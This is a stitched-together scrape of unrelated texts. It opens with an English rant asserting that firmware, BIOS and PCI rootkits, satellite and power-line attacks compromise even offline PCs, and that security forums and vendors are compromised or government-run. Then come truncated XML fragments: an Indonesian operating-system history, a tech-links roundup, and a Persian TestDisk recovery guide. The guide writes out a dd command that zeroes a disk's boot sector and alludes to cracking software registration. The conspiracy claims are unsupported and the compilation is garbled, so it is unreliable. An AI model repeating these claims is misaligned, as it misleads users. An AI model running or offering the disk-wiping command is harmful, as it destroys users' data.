Where are the commercial or free anti-malware organizations and individual’s products which hash and compare in the cloud and scan for malware for these vectors? If you post on mailing lists or forums of most anti-malware organizations about this threat, one of the following actions will apply: your post will be deleted and/or moved to a hard to find or ‘deleted/junk posts’ forum section, someone or a team of individuals will mock you in various forms ‘tin foil hat’, ‘conspiracy nut’, and my favorite, ‘where is the proof of these infections?’ One only needs to search Google for these threats and they will open your malware world view to a much larger arena of malware on devices not scanned/supported by the scanners from these freeware sites. This point assumed you’re using the proprietary Microsoft Windows OS. Now, let’s move on to Linux. 
The rootkit scanners for Linux are few and poor. If you’re lucky, you’ll know how to use chkrootkit (but you can use strings and other tools for analysis) and show the strings of binaries on your installation, but the results are dependent on your capability of deciphering the output and performing further analysis with various tools or in an environment such as Remnux Linux. None of these free scanners scan the earlier mentioned areas of your PC, either! Nor do they detect many of the hundreds of trojans and rootkits easily available on popular websites and the dark/deep web. 
Compromised defenders of Linux will look down their nose at you (unless they are into reverse engineering malware/bad binaries, Google for this and Linux and begin a valuable education!) and respond with a similar tone, if they don’t call you a noob or point to verifying/downloading packages in a signed repo/original/secure source or checking hashes, they will jump to conspiracy type labels, ignore you, lock and/or shuffle the thread, or otherwise lead you astray from learning how to examine bad binaries. The world of Linux is funny in this way, and I’ve been a part of it for many years. The majority of Linux users, like the Windows users, will go out of their way to lead you and say anything other than pointing you to information readily available on detailed binary file analysis. 
Don’t let them get you down, the information is plenty and out there, some from some well known publishers of Linux/Unix books. Search, learn, and share the information on detecting and picking through bad binaries. But this still will not touch the void of the APT malware described above which will survive any wipe of r/w media. I’m convinced, on both *nix and Windows, these pieces of APT malware are government in origin. Maybe not from the US, but most of the ‘curious’ malware I’ve come across in poisoned binaries, were written by someone with a good knowledge in English, some, I found, functioned similar to the now well known Flame malware. From my experience, either many forum/mailing list mods and malware developers/defenders are ‘on the take’, compromised themselves, and/or working for a government entity. 
Search enough, and you’ll arrive at some lone individuals who cry out their system is compromised and nothing in their attempts can shake it of some ‘strange infection’. These posts receive the same behavior as I said above, but often they are lone posts which receive no answer at all, AT ALL! While other posts are quickly and kindly replied to and the ‘strange infection’ posts are left to age and end up in a lost pile of old threads. 
If you’re persistent, the usual challenge is to, “prove it or STFU” and if the thread is not attacked or locked/shuffled and you’re lucky to reference some actual data, they will usually attack or ridicule you and further drive the discussion away from actual proof of APT infections. 
The market is ripe for an ambitious company or individual to begin demanding companies and organizations who release firmware and design hardware to release signed and hashed packages and pour this information into the cloud, so everyone’s BIOS is checked, all firmware on routers, NICs, and other devices are checked, and malware identified and knowledge reported and shared openly. 
But even this will do nothing to stop backdoored firmware (often on commercial routers and other networked devices of real importance for government use – which again opens the possibility of hackers discovering these backdoors) people continue to use instead of refusing to buy hardware with proprietary firmware/software. 
Many people will say, “the only safe computer is the one disconnected from any network, wireless, wired, LAN, internet, intranet” but I have seen and you can search yourself for and read about satellite, RF, temperature, TEMPEST (is it illegal in your part of the world to SHIELD your system against some of these APT attacks, especially TEMPEST? And no, it’s not simply a CRT issue), power line and many other attacks which can and do strike computers which have no active network connection, some which have never had any network connection. Some individuals have complained they receive APT attacks throughout their disconnected systems and they are ridiculed and labeled as a nutter. The information exists, some people have gone so far as to scream from the rooftops online about it, but they are nutters who must have some serious problems and this technology with our systems could not be possible. 
I believe most modern computer hardware is more powerful than many of us imagine, and a lot of these systems swept from above via satellite and other attacks. Some exploits take advantage of packet radio and some of your proprietary hardware. Some exploits piggyback and unless you really know what you’re doing, and even then… you won’t notice it. 
Windows user 
Back to the Windows users, a lot of them will dismiss any strange activity to, “that’s just Windows!” and ignore it or format again and again only to see the same APT infected activity continue. Using older versions of sysinternals, I’ve observed very bizarre behavior on a few non networked systems, a mysterious chat program running which doesn’t exist on the system, all communication methods monitored (bluetooth, your hard/software modems, and more), disk mirroring software running[1], scans running on different but specific file types, command line versions of popular Windows freeware installed on the system rather than the use of the graphical component, and more. 
[1] In one anonymous post on pastebin, claiming to be from an intel org, it blasted the group Anonymous, with a bunch of threats and information, including that their systems are all mirrored in some remote location anyway. 
[2] Or other government, US used in this case due to the article source and speculation vs. China. This is not to defend China, which is one messed up hell hole on several levels and we all need to push for human rights and freedom for China’s people. For other, freer countries, however, the concentration camps exist but you wouldn’t notice them, they originate from media, mostly your TV, and you don’t even know it. As George Carlin railed about “Our Owners”, “nobody seems to notice and nobody seems to care”. 
[3] http://www.stallman.org/ 
Try this yourself on a wide variety of internet forums and mailing lists, push for malware scanners to scan more than files, but firmware/BIOS. See what happens, I can guarantee it won’t be pleasant, especially with APT cases. 
So scan away, or blissfully ignore it, but we need more people like RMS[3] in the world. Such individuals tend to be eccentric but their words ring true and clear about electronics and freedom. 
I believe we’re mostly pwned, whether we would like to admit it or not, blind and pwned, yet fiercely holding to misinformation, often due to lack of self discovery and education, and “nobody seems to notice and nobody seems to care”. 
## 
Schneier has covered it before: power line fluctuations (differences on the wire in keys pressed). 
There’s thermal attacks against cpus and temp, also: 
ENF (google it) 
A treat (ENF Collector in Java): 
sourceforge dot net fwdslash projects fwdslash nfienfcollector 
No single antimalware scanner exists which offers the ability to scan (mostly proprietary) firmware on AGP/PCI devices (sound cards, graphics cards, usb novelty devices excluding thumb drives), BIOS/CMOS. 
If you boot into ultimate boot cd you can use an archane text interface to dump BIOS/CMOS and examine/checksum. 
The real attacks which survive disk formats and wipes target your PCI devices and any firmware which may be altered/overwritten with something special. It is not enough to scan your hard drive(s) and thumb drives, the real dangers with teeth infect your hardware devices. 
When is the last time you: 
Audited your sound card for malware? 
Audited your graphics card for malware? 
Audited your network card for malware? 
Google for: 
* AGP and PCI rootkit(s) 
* Network card rootkit(s) 
* BIOS/CMOS rootkit(s) 
Our modern PC hardware is capable of much more than many can imagine. 
Do you: 

Know your router’s firmware may easily be replaced on a hacker’s whim?
Shield all cables against leakage and attacks
Still use an old CRT monitor and beg for TEMPEST attacks?
Use TEMPEST resistant fonts in all of your applications including your OS?
Know whether or not your wired keyboard has keypresses encrypted as they pass to your PC from the keyboard?
Use your PC on the grid and expose yourself to possible keypress attacks?
Know your network card is VERY exploitable when plugged into the net and attacked by a hard core blackhat or any vicious geek with the know how?
Sarch out informative papers on these subjects and educate your friends and family about these attacks?
Contact antimalware companies and urge them to protect against many or all these attacks?

Do you trust your neighbors? Are they all really stupid when it comes to computing or is there a geek or two without a conscience looking to exploit these areas? 
The overlooked threat are the potential civilian rogues stationed around you, especially in large apartment blocks who feed on unsecured wifi to do their dirty work. 
With the recent news of Russian spies, whether or not this news was real or a psyop, educate yourself on the present threats which all antimalware scanners fail to protect against and remove any smug mask you may wear, be it Linux or OpenBSD, or the proprietary Windows and Mac OS you feel are properly secured and not vulnerable to any outside attacks because you either don’t need an antivirus scanner (all are inept to serious attacks) or use one or several (many being proprietary mystery machines sending data to and from your machine for many reasons, one is to share your information with a group or set database to help aid in threats), the threats often come in mysterious ways. 
Maybe the ancients had it right: stone tablets and their own unique language(s) rooted in symbolism. 
# 
I’m more concerned about new rootkits which target PCI devices, such as the graphics card and the optical drives, also, BIOS. Where are the malware scanners which scan PCI devices and BIOS for mismatches? All firmware, BIOS and on PCI devices should be checksummed and saved to match with others in the cloud, and archived when the computer is first used, backing up signed firmware. 
When do you recall seeing signed router firmware upgrades with any type of checksum to check against? Same for PCI devices and optical drives and BIOS. 
Some have begun with BIOS security: 
http://www.biosbits.org/ 
Some BIOS has write protection in its configuration, a lot of newer computers don’t. 
# 
“Disconnect your PC from the internet and don’t add anything you didn’t create yourself. It worked for the NOC list machine in Mission Impossible” 
The room/structure was likely heavily shielded, whereas most civvies don’t shield their house and computer rooms. There is more than meets the eye to modern hardware. 
Google: 
subversion hack: 
tagmeme(dot)com/subhack/ 
network card rootkits and trojans 
pci rootkits 
packet radio 
xmit “fm fingerprinting” software 
“specific emitter identification” 
forums(dot)qrz(dot)com 
how many malware scanners scan bios/cmos and pci/agp cards for malware? zero, even the rootkit scanners. have you checksummed/dumped your bios/cmos and firmware for all your pci/agp devices and usb devices, esp vanity usb devices in and outside the realm of common usb devices (thumbdrives, external hdds, printers), 
Unless your computer room is shielded properly, the computers may still be attacked and used, I’ve personally inspected computers with no network connection running mysterious code in the background which task manager for windows and the eqiv for *nix does not find, and this didn’t find it all. 
Inspect your windows boot partition in *nix with hexdump and look for proxy packages mentioned along with command line burning programs and other oddities. Computers are more vulnerable than most would expect. 
You can bet all of the malware scanners today, unless they are developed by some lone indy coder in a remote country, employ whitelisting of certain malware and none of them scan HARDWARE devices apart from the common usb devices. 
Your network cards, sound cards, cd/dvd drives, graphics cards, all are capable of carrying malware to survive disk formatting/wiping. 
Boot from a Linux live cd and use hexdump to examine your windows (and *nix) boot sectors to potentially discover interesting modifications by an unknown party.

  <summary><![CDATA[arah Perkembangan Sistem Operasi      21 Votes Sistem operasi merupakan sebuah penghubung antara pengguna dari komputer dengan perangkat keras komputer. Sebelum ada sistem operasi, orang hanya mengunakan komputer dengan menggunakan sinyal analog dan sinyal digital (silahkan cari sendiri apa itu sinyal analog dan sinyal digital). Seiring dengan berkembangnya pengetahuan dan teknologi, pada saat ini terdapat berbagai sistem operasi dengan keunggulan masing-masing. Untuk lebih memahami sistem operasi maka sebaiknya perlu diketahui terlebih dahulu beberapa konsep dasar mengenai sistem operasi itu sendiri.Pengertian sistem operasi secara umum adalah pengelola seluruh sumber-daya yang terdapat pada sistem komputer dan menyediakan sekumpulan layanan (system calls) ke pemakai sehingga memudahkan danmenyamankan penggunaan serta pemanfaatan sumber-daya sistem komputer ( artikel bahan kuliah).Menurut Wikipedia sistem Operasi adalah software pada lapisan pertama yang ditempatkan pada memeori komputer pada saat komputer dinyalakan. Sedangkan software-software lainnya dijalankan setelah Sistem Operasi berjalan, dan Sistem Operasi akan melakukan layanan inti umum untuk software-software itu.Menurut Tanenbaum, sistem operasi mengalami perkembangan yang sangat pesat, yang dapat dibagi kedalam empat generasi:1. Generasi Pertama (1945-1955)Generasi pertama merupakan awal perkembangan sistem komputasi elektronik sebagai pengganti sistem komputasi mekanik, hal itu disebabkan kecepatan manusia untuk menghitung terbatas dan manusia sangat mudah untuk membuat kecerobohan, kekeliruan bahkan kesalahan. Pada generasi ini belum ada sistem operasi, maka sistem komputer diberi instruksi yang harus dikerjakan secara langsung.2. Generasi Kedua (1955-1965)Generasi kedua memperkenalkan Batch Processing System, yaitu Job yang dikerjakan dalam satu rangkaian, lalu dieksekusi secara berurutan.Pada generasi ini sistem komputer belum dilengkapi sistem operasi, tetapi beberapa fungsi sistem operasi telah ada, contohnya fungsi sistem operasi ialah FMS (Fortran Monitoring System) dan IBSYS. Jadi generasi komputer kedua ini merupakan generasi pertama dari sistem Operasi.3. Generasi Ketiga (1965-1980)Pada generasi ini perkembangan sistem operasi dikembangkan untuk melayani banyak pemakai sekaligus, dimana para pemakai interaktif berkomunikasi lewat terminal secara on-line ke komputer, maka sistem operasi menjadi multi-user (di gunakan banyak pengguna sekaligus) dan multi-programming (melayani banyak program sekaligus).4. Generasi Keempat (Pasca 1980an)Dewasa ini, sistem operasi dipergunakan untuk jaringan komputer dimana pemakai menyadari keberadaan komputer-komputer yang saling terhubung satu sama lainnya. Pada masa ini para pengguna juga telah dinyamankan dengan Graphical User Interface yaitu antar-muka komputer yang berbasis grafis yang sangat nyaman, pada masa ini juga dimulai era komputasi tersebar dimana komputasi-komputasi tidak lagi berpusat di satu titik, tetapi dipecah dibanyak komputer sehingga tercapai kinerja yang lebih baik.Adapun sejarah sistem operasi yang dirinci dari tahun 1980an. Artikel ini menguraikan sejarah sistem operasi dari DOS, Mac, Windows, BSD, sampai Linux.1956GM-NAAI/O :Sistem operasi pertama ini digunakan pertama kali oleh General Motors pada komputer besar IBM 704.

  <title><![CDATA[Technology Short Take #25]]></title>
  <summary><![CDATA[Welcome to Technology Short Take #25, my irregularly-published collection of links, articles, thoughts, and rants. It’s been a while since my last Technology Short Take (almost three months!); my apologies for that. This is my first time publishing a Technology Short Take with my new filesystem-based approach of managing resources. We’ll see how well it goes… 
In any case, let’s get on with it! 
Networking

Some folks from Nicira (now part of VMware) recently published a blog post discussing the OVSDB IETF draft (see here). It’s a valid point—people get all worked up over OpenFlow, but OpenFlow doesn’t address the management plane (only the control plane). Unfortunately, the management plane is often the place where vendors choose to “innovate” and “differentiate” their offerings, which—in my humble view—makes any sort of standardization in the management plane extremely difficult. I could be wrong (wouldn’t be the first time).
I think this three-part series on new network models for cloud computing (part 1, part 2, and part 3), while almost a year old, is quite good. James Urquhart, the author of the series, does a good job of breaking down some of the commonly-discussed “disruptive” technologies like Quantum (part of OpenStack) and OpenFlow. Worth a read if you are trying to get up to speed on these efforts, in my opinion.
There’s some additional information on the Quantum release on Folsom here.
Erik Smith, notably known for his outstanding posts on storage and FCoE, takes a stab at describing some of the differences between SDN and network virtualization in this post.
I found this series of posts to be helpful when I was working on configuring LACP with Open vSwitch (I hope to have a blog post on that up soon).
Reading these early OpenFlow meeting notes (via Brent Salisbury, aka @networkstatic on Twitter) was very fascinating. There’s a lot to digest there (for me, anyway, there is a lot to digest).

Servers/Hardware
Nothing this time around—but I’ll keep my eyes peeled for interesting information to include next time! 
Security

I came across this post on CloudFoundry’s User Account and Authentication Service (the UAA). If you’re seeking more information on UAA, this looks like a good place to start.

Cloud Computing/Cloud Management

This is an awesome overview of the OpenStack Folsom architecture, courtesy of Ken Pepple. Definitely worth reading, in my view.

Operating Systems/Applications

I haven’t had much time to spend working with Puppet (a shame, I really enjoy the product—hopefully I’ll get back to it soon). When I do get back into working with Puppet again, I’m going to do my best to follow this advice regarding Puppet modules.

Storage

Sean Thulin has a nice write-up on configuring VASA for use with a VNX.
Is Cisco’s Insieme effort producing a storage product? Some interesting speculation can be found here and here (hat tip to Erik Smith).
Speaking of Erik Smith…this post on the impact of bit errors on I/O consolidation is a great post. I learn something from just about every one of Erik’s posts.
Another great post by Jason Boche on thin provisioning and VAAI UNMAP support. He does a great job of pulling together resources and explaining how it all works, including some great practical advice for real-world usage.
If storage is your thing—especially in VMware environments—I’d recommend having a look at Cormac Hogan’s blog for his series on vSphere 5.1 storage enhancements. It starts here.
There’s an interesting write-up here on a globally distributed OpenStack Swift cluster. What wasn’t clear to me—I guess I’m just dense—was whether the functionality SwiftStack was describing in their post was actually in current releases of Swift (and, if so, is it only in their commercial Swift release, or the open source Swift versions) or if this was “pie-in-the-sky” thinking about functionality that should be added at some point in the future. Anyone have any clarification here?

Virtualization

Need to add an alias to your vCloud Director cell? Jason Boche shows you how.
This is kind of a nice feature in Hyper-V 3: DHCP Guard. According to this article by Rick Vanover, this feature allows you to protect your network against rogue/unauthorized DHCP servers. Anyone actually tried this feature out yet (other than in a lab)?
William Lam shows you how to use ovftool to copy VMs directly between ESXi hosts. That’s pretty handy.
Only a true geek would be interested in this, but here’s some information on running OpenBSD in KVM on Linux. Given my past interest in OpenBSD and my present interest in KVM on Linux, this might be something I’ll be trying myself soon. Sadly, it looks like that post is the author’s last post in three years…shame.
I’m not sure if this should be considered “storage” or “virtualization,” as the lines continue to blur every day. In any case, this article by Frank Denneman on Storage DRS load balancing frequency might be useful to you.
This post describes some of the benefits of KVM’s VirtIO driver and how to use VirtIO with OpenStack. You’ll note, by the way, that Nova uses libvirt to manipulate KVM. This is one of the reasons I’ve been spending some time with libvirt—as part of the “glue” between Nova and KVM, I think it’s important to understand how libvirt works. (This is also why I’ve been spending time with Open vSwitch, which is a critical construct in Quantum.)

I suppose I should wrap things up now. Feel free to speak up in the comments if you found something I included here useful, or if there’s additional information that would benefit other readers. All courteous comments are welcome!

  <title><![CDATA[TestDisk برگرداندن پارتیشن ها و فایلهای از دست رفته]]></title>
  <summary><![CDATA[در ادامه مطلب به صورت کامل در مورد testdisk توضیح نوشته شده ولی هدفم از این ارسال یک راهنمای سریع در مورد testdisk هست که خودم بهش برخورد کردم 
به نظر من هر کس که تو کامپیوترش از چند سیستم عامل مختلف مخصوصا ویندوز استفاده کنه و بخواد در کنارش چند تا لینوکس تستی هم داشته باشه بالاخره با مشکل هارد و از دست دادن اطلاعات مواجه خواهد شد 
من داشتم تو ویندوز کار میکردم که سیستم هنگ کرد و بعد از ریستارت دیگه هیچی نیومد با سی دی لایو بک ترک بوت کردم و متوجه شدم که هارد رو خالی نشون میده 
در نتیجه تصمیم گرفتم از برنامه ی TestDisk برای رفع این مشکل استفاده کنم 
این برنامه به صورت نصب شده وجود داشت وقتی از طریق run command این برنامه رو اجرا میکردم راهنمای استفاده در واقع usage ‌از این برنامه نشون میداد و ترمینال آماده دستور بود 
ولی وقتی testdisk یا sudu testdisk رو اجرا میکردم خطای زیر نمایش داده میشد: 
The program ‘testdisk’ is currently not installed.  You can install it by typing: 
apt-get install testdisk 
You will have to enable the component called ‘universe’ 
خوب خطا اینو میگه که باید با دستور apt-get install testdisk باید نصب کنیم ولی بعد از اجرای این دستور نصب بودن و نیازی به نصب نداشتن را مشاهده خواهید کرد 
خلاصه برای رفع این مشکل به صورت جدا testdisk رو نصب میکنیم 
به این صورت که ابتدا آخرین نسخه testdisk رو از سایت اصلی اون یعنی : http://www.cgsecurity.org/wiki/TestDisk_Download دانلود میکنیم 
همانطور که مشاهده میکنید نسخه های متفاوتی وجود دارد که بسته به سیستم عامل خودتون یکی از نسخه ها رو انتخاب کنید 
به عنوان مثال برای من که از بک ترک یا اوبونتو نسخه ی ۳۲ بیتی استفاده میکنم : 

Linux, kernel 2.6.18 or later i386

بعد از دانلود یه سراغ ترمینال و مسیر دانلود شده میرویم و با دستورات زیر نصب و اجرا میکنیم 
tar xjvf testdisk-6.14-WIP.linux26.tar.bz2 
cd testdisk-6.14-WIP 
sudo ./testdisk_static 
برای آشنایی و نحوه کار با این برنامه مقاله ای در ادامه مطلب قرار دادم امیدوارم براتون مفید واقع بشه 
 
 برگرداندن پارتیشنها و فایلهای پاک شده در لینوکس  
بـــرای کســــانی کــه بــا لینوکس کار می‌کنند و عـــادت دارنــد چند لینوکس بر یک دستگاه داشته باشند و مخصوصاً سیستم‌عامل عمو بیل را هم کنارش نصب کنند، پریدن پارتیشنها و از دست دادن اطلاعات چیز تازه‌ای نیست و می‌توان گفت این شتریست که یکبار تا بحال دم در خانه‌شان خوابیده و اگر هم هنوز نخوابیده بالاخره می‌خوابد! کل این مقاله به ۳ قسمت تقسیم شده است: مقدمه، برگرداندن فایلهای پاک شده و برگرداندن پارتیشنهای پاک شده. 
مقدمه 
اگر بخواهم کمی مقدمه برای ایـــن ۲ برنامه مفیدی که پیدا کــــرده‌ام بنویسم، باید بگویم که من تا بحال دو بار مرتکب حماقت format کردن شده‌ام. البته هر دو بار هم بدلیل نصب سیستم عامل عمو بیل این فاجعه اتفاق افتاده است. بار اول که به اشتباه هارد ۱۲۰GB خـــودم را بـــه جای یک پارتیشن ۱۰GB به کل format کردم و تــازه بعدش فهمیدم چه کرده‌ام. بار دوم هم اشتباهی با دستور [۱] زیر تمام MBR را [۲] پاک کردم: 
#dd if=/dev/zero of=/dev/hda bs=512 count=1 
بــنابراین دو حـــالت داریم: یــکی اینکه شما تمام فایلهایتان را دستی پاک کنید (مثلاً فرمت کـنـید) و بخواهید فایلها را برگردانید، دیگری اینکه partition table به کل پاک شود و یا قسمت از آن صدمه ببیند. از علایم صدمه دیدن partition table این که یکدفعه نتوانید یک پارتیشن را در سیستمتان ببینید، پارتیشنی که میدانید وجود داشته و کار می‌کرده. 
من فکر می‌کنم برنامه اولی که معرفی می‌کنم (Stellar Phoenix Linux) قابلیت اینجا کار دوم (برگرداندن پارتیشنهای پاک شده) را هم داشته باش (تقریبا مطمئنم)، اما به دلیل اینکه این برنامه را باید خریداری کرد و اینکه برنامه دومی که معرفی می‌کنم خیلی راحتتر کار برگرداندن پارتیشنهای پاک شده را انجام می‌دهد و نیاز هم به نصب ندارد و کاملاً هم آزاد و با پروانه GNU/GPL منتشر شده است، برگرداندن پارتیشنهای پاک شده را به عهده آن می‌گذارم. 
مورد اول: برگرداندن فایلهای پاک شده توسط Stellar Phoenix Linux 
اشاره کــردم کــه بار اول چطور ۱۲۰GB هاردم را بجای ۱۰GB به کل format کرده بودم. می‌شود گفت که تمام کتابها و برنامه‌هایم و بطور کلی همه داده‌هایم در پارتیشنهای لینوکسی با فرمت ext3 بود و هر چه برنامه recovery در بازار بود صرفاً به بازگرداندن پارتیشنهای fat و ntfs افتخار می‌کردن و هیچ اثری از ext3 در آنها نبود. با مجاهدتهای خستگی‌ناپذیر به برنامه‌ای با نام Stellar Phoenix For Linux رسیدم. 
این برنامه تحت ویندوز اجرا می‌شد. بنابراین ناچار شدم همان ۱۲۰GB فرمت شده را مجدد پارتیشن‌بندی کنم و ویندوز نصب کنم ۳ و تازه بعد برنامه را اجرا کنم. برنامه بی‌نقص اجرا شد و بعد از یک scan تقریباً سریع (کمتر از ۵ دقیقه) تمام پارتیشن‌های گــم شــــده لینوکسی مــن را نشان داد و این امــکــان را به مــن داد تــا بـا ولــع هر چه تمام‌تر محتوای هر پارتیشن را browse کــنــم و تمام فایلــهای گم شدم را ببینم. بعد از اینکه تمام فایلهایی که م‌خواستم برگردانم را انتخاب کردم و کلید start recovery را فشار دادم، برنامه پیغام داد که از اینجا به بعد باید برنامه را register کنی، قیمت برنامه هم اگر درست یادم مانده باشد در حدود ۷۹ دلار است و من آب از لوچه آویزان و سرگردان ناچار شدم به روشهای غیر متعارفی برای register کردن برنامه متوصل شوم [۴] که آخرش هم registerاش کردم و تمام اطلاعات را برگرداندم. 
چـــون این برنامـــه در محیط ویندوز نصب می‌شود، کار کردن با آن بسیـــار ساده است، تنها در حد چند کلیک و انتخاب partitionهای از بین رفته‌ای که می‌خواهید جستجو کنید. بنــابراین نیــازی به screenshot و نــحوه کار و از اینجور حرفها نمی‌بینم. این برنامه را می‌توانید از آدرس زیر دانلود کنید: 
http://www.stellarinfo.com/linux-data-recovery.htm 
در همان صفحه هم لینک reviewها وجود دارد که بد نیست مطالعه کنید. 
تا فراموش نکردم بگویم هیــچ برنامه‌ای بــرای بـرگـردانـــدن داده‌های روی یک پارتیشن ReiserFS تــا به امروز ندیدم، بنابر این اگر تنها فرقی کـــه بیــن ReiserFS و ext2/3 قائل هستید این است که اولـــی بــا R شـــروع مــی‌شــود و دومـــی با e، لزومی ندارد از ReiserFS استفاده کنید. به همون ext3 بسنده کنید. 
 برنامه TestDisk  
تـسـت دیـسک یک برنامه بسیار قوی برای بازیابی پارتیشنها و همچنین bootable کــردن دیــسکـهایی اســت که دیگر بوت نــمی‌شونــد. TestDisk مـی‌تواند تحـت Dos، ویندوز ۳۲ بیتی (NT4، ۲۰۰۰ و XP)، لینوکسهای مختلف، FreeBSD و NetBSD و SunOS و MacOS اجرا شــود. ایــن بــرنـامـه مـستقـل از محــیط اجرایی، می‌تواند پارتیشنهای گمشده زیر را شناسایی کند: 


BeFS (BeOS) 



BSD disklabel ( FreeBSD/OpenBSD/NetBSD )
CramFS, Compressed File System
DOS/Windows FAT12, FAT16 and FAT32
HFS and HFS+, Hierarchical File System
JFS, iBM’s Journaled File System
Linux Ext2 and Ext3
Linux Raid

RAiD 1: mirroring
RAiD 4: striped array with parity device
RAiD 5: striped array with distributed parity information
RAiD 6: striped array with distributed dual redundancy information


Linux Swap (versions 1 and 2)
LVM and LVM2, Linux Logical Volume Manager
Mac partition map
Netware NSS
NTFS ( Windows NT/2K/XP/2003 )
ReiserFS 3.5 and 3.6
Sun Solaris i386 disklabel
UFS and UFS2 (Sun/BSD/…)
XFS, SGi’s Journaled File System

این برنامه و مستندات کاملش را می‌توانید در آدرس زیر پیدا کنید: 
http://www.cgsecurity.org 
من خودم نسخه لینوکــسی‌ را نصب کردم. برنامه دو نوع نسخه لینوکسی دارد، یک نوع بنام linux static کـــه باید بر روی دیسکت شده و مـــورد استفاده قرار بگیرد. این دیسکت bootable نیست، اما اگر دیسکت و یا cd بوت ندارید هم نگران نباشید، در سایت TestDisk به هنگام دانلود این نسخه، آدرس یک دیسکت live کوچک را هم در دسترس گذاشته تا بتوانید اول سیستم را بوت کرده و بعد با TestDisk کار کنید. نسخه دیگری هم که ارائه شده نسخه قابل نصب است که می‌توانید بر روی سیستم نصب کنید. من چون دو هارد داشتم و یکی مشکل پیدا کرده بود، توانستم بر روی FC3ای که روی هارد دوم داشتم نصبش کنم. البته جالب است که در خود سایت اشاره شده این برنامه در توزیعهای مختلفی مثل Gentoo، Knoppix و چندین و چند توزیع دیگر بصورت پیش‌فرض وجود دارد. 
اگــر می‌خواهیــد از linux static استفاده کنید که تکلیفتان مشخص است، باید چیزی را که دانلود می‌کنید رو دیسکت کپی کنید، و اگر هم می‌خواهید نصب کنید که دو نسخه دارد، هم بصورت rpm و هم کامپایلی که هر کدام را خواستید می‌توانید انتخاب و نصب کنید. 
بعد از اینکه برنـــامه را نصب کردید، با کاربر root دستور testdisk را اجرا کنید. البته با اینکه من برنامه را کامپایل کردم و make install را هـــم در آخــر زدم، باز هم برنامه را در PATH نصب نکرد، بنابر این اگر testdisk زدید و اجرا نشد چندان وحشت نکنید (البته فرض را بر این می‌گیریم که به هنگام نصب هیچگونه خطایی دریافت نکردید!)، با یک locate ساده می‌توانید پیداش کنید. در مورد کاربران Fedora Core باید بگویم که برنامه در مسیر /usr/sbin قرار خواهد گرفت. 
بعد از اجرای برنامه با متن زیر روبرو می‌شوید: 
 
هــمانطور که می‌بینید هارد دیسکهای شما را در این صفحه نمایش می‌دهد. هاردی را که می‌خواید انتخاب می‌کنید و گزینه proceed را انتخاب می‌کنید. در صفحه دوم باید نوع partition table را انتخاب کنید. در بیشتر موارد همان گزینه اول (intel/PC Partition) درست است، اگر کسی هم mac و یا SunOS دارد که باید چه کند. 
 
بـــعد از enter کـــردن بر گزیـــنه مورد نظر، به صفحه سومی هدایت می‌شوید که گزینه‌های مختلفی دارد. اولین گزینه Analyse است، همان گزینه را انتخاب کنید و enter را بزنید. البته دقت کنید که پایین همین صفحه نوشته که هارد شما ممکن است geometryهای مختلفی داشته باشد و برای برگرداندن صحیح پارتیشنها باید از geometry صحیح استفاده کنید. اگر دقت کنید در همین صفحه دگمه‌ای به نام Geometry هست. در پاراگراف بعدی (بعد از اینکه آنالیز تمام شد) در این مورد بحث می‌کنم، فعلاً جای این کلید را به خاطر داشته باشید. 
 
حالا باید کمی (کمی بیشتر از کمی) منتظر بمانید تا آنالیز برنامه تمام شود. وقتی که آنالیز تموم شد، بسیار احتمال داره که یک warning ببینید مبنی بر اینکه نرم‌افزار حدس میزند geometry درست هارد شما مثلاً ۲۵۵ بـاشد. به هیچ عنوان این warning را دست کم نگیرید. حتماً مقدار درستی که حدس زده را یاد داشت کنید و escape بزنید و به منوی قبلی برگردید و وارد بخش geometry شود. تاکید می‌کنم به هیچ عنوان این اخطار را دست کم نگیرید. خودش یک سری توضیحات در سایت دارد مبنی بر اینکه اصلاً مقدار head درست یعنی چی و به چه دردی میخورد. من همه آن توضیحات را نفهمیدم، ولی به زبان ساده هارد درایو ها اطلاعات را در قسمتهایی با ظرفیت یکسان (مثلا هر ۱۶ تا ۱۶ تا و یا ۲۵۵ تا ۲۵۵ تا) ذخیره می‌کنند و برای برگرداندن اطلاعات اگر فقط معلوم باشد کــه این عدد ثابت چقدر است، خیلی راحت می‌شود همه چیز را برگرداند. خیلی ساده هم می‌توانید تاثیر این عدد را ببینید، وقتی که وارد قسمت geometry شوید و گزینه Heads را انتخاب کنید و عدد صحیح را وارد نمایید، و دوباره برگردیــد و Analyse کنید، می‌بینید که در چند ثانیه همه پارتیشن‌ها را پیدا کرده و دیگر آنالیز آنقدر وقت نمی‌گیرد. اگر عدد غلط را انتخاب کنید، یک جدول از تمام پارتیشنها جلوی شما ظاهر می‌شود که در کنار همه کاراکتر D یا همان Deleted قــرار دارد و شما مثل یک پازل باید سعی کنید بفهمید کدام پارتیشن primary، کدام extended و حالا کدام logical هست! بعد هم هر چه آن را بالا و پایین کنید، باز هم نمی‌توانید تمام پارتیشنها را برگردانید! بنابراین اصلاً معطل نکنید و آن عدد Heads را پیدا کرده و درست وارد کنید. 
 
بعد از اینکه عدد صحیح را وارد کردید و به قسمت Analyse برگشتید، نرم‌افزار به سرعت partition table درست را برای شما پیدا می‌کند و به رنگ سبز نمایش می‌دهد. 
 
اگر هر کدام از پارتیشنها سفید بود و کنارش کاراکتر D قرار داشت، واقعاً برای شما متاسفم! البته نه آنقدر، چون برای خودم قبل از اینکه بفهمم آن عدد Heads را واقعاً باید وارد کرد، همه پارتیشنها سفید بود. اگر حتی بعـــد از وارد کردن درست عدد Heads و زدن گزینه Ok (طبق دومین شکل قبلی) بــاز هم پارتیشن سفید رنگی می‌بینید، راه‌حلی به نظر من نمی‌رسد، چــون خودم به چنین مشکلی برنخوردم. در ایــــن حالت با خود Christophe که email‌اش بالای صفحه سایت هست تماس بگیرید. 
یکــی از مزیتهایی که برنامه دارد این است که می‌توانید روی هر پارتیشن رفــته و با زدن کلیــد p وارد پارتیشن شوید و داده‌هــای عزیزتــان را ببـینید. البته برای دیدن محتویات هر نوع پارتیشنی بایـد بسته‌های لازمــه را از قبل نصب داشته باشید، که معمولاً تنها مشکلی که ممکن است پیش بیایـد برای پارتیشنـ‌هـای NTFS هســت کــه آن هــم چندان مهم نیست، چون اگر سبز شده باشد یعنی برش خواهید گرداند، لازم نیست حتماً داخلش معلوم باشد. 
وقتی از همه چیز راضی بودید، enter را می‌زنید و بعد از پایین صفحه گزینه Write را انتخاب می‌کنید. 
 
در پایان امیدوارم توانسته باشم در این موقعیت سخت کمکی کنم و شما موفق شوید اطلاعاتتان را برگردانید. 
توصــیه نـهایی: همیــشه بــا دستور زیــر یــک image از parition tableتان داشــته باشید، در چنین مواقعی خیلی بدرد می‌خورد: 
#dd if=/dev/hda of=HDA1stTrack.bin bs=512 count=63 
